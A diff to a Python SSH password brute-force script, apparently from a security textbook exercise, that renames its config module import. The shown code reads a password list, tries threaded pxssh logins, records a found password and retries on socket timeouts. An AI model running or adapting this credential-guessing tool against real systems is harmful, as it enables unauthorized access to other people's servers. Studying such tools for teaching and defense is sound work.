@@ -4,9 +4,9 @@ import sys
 import time
 import threading
 from pexpect import pxssh
-import config
+import code.viscous.chapter2.vpconfig as vpconfig
 
-connection_lock = threading.BoundedSemaphore(value=config.MAX_CONNECTIONS)
+connection_lock = threading.BoundedSemaphore(value=vpconfig.MAX_CONNECTIONS)
 
 def connect(host, user, password, release):
     ''' connect to ssh'''
@@ -14,10 +14,10 @@ def connect(host, user, password, release):
         s = pxssh.pxssh()
         s.login(host, user, password)
         print('[+] Password config.FOUND: ' + password)
-        config.FOUND = True
+        vpconfig.FOUND = True
     except Exception as e:
         if 'read_nonblocking' in str(e):
-            config.FAILS += 1
+            vpconfig.FAILS += 1
             time.sleep(5)
             connect(host, user, password, False)
         elif 'synchronize with original prompt' in str(e):
@@ -46,10 +46,10 @@ def main():
 
     with open(passwdFile, 'r', encoding='utf-8-sig') as fn:
         for line in fn.readlines():
-            if config.FOUND:
+            if vpconfig.FOUND:
                 print('[*] Exiting: Password config.FOUND')
                 sys.exit(0)
-            if config.FAILS > 5:
+            if vpconfig.FAILS > 5:
                 print('[!] Exiting: Too Many Socket Timeouts')
                 sys.exit(0)
             connection_lock.acquire()
